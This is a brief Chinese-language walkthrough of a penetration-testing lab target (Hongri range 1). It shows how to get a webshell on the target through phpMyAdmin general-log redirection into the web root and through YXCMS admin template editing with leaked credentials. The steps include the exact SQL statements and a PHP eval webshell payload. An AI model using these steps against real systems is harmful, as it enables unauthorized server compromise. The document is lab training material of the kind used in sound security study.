红日靶场一

外网打点

信息收集

对靶机192.168.10.32端口扫描发现只有80能用

直接访问80端口发现泄露了网站路径

对靶机192.168.10.32:80进行目录扫描发现phpmyadmin和yxcms目录还有一个

phpmyadmin日志写shell

  1. 查看日志状态

    在sql处运行语句 show variables like '%general%';

general_log为off

2.打开日志

运行语句 set global general_log="on"

3.修改网站日志在网站根目录C:/phpStudy/WWW/1.php

运行语句 set global general_log_file = 'C:/phpStudy1/WWW/1.php'

4.写入一句话木马

select "<?php @eval($_POST['cmd']);?>"

5.蚁剑连接

yxcms打点

1.访问yxcms在公告信息处发现后台目录和账号密码

2.通过账号密码进入后台

3.后台sql执行处应该可以日志getshell

4.前台模板管理模板处写getshell

点编辑可以直接写webshell

但是不知道文件路径先对目录扫描一波扫描到备份文件，通过备份文件找到模板文件路径/yxcms/protected/apps/default/view/default/xxx.php
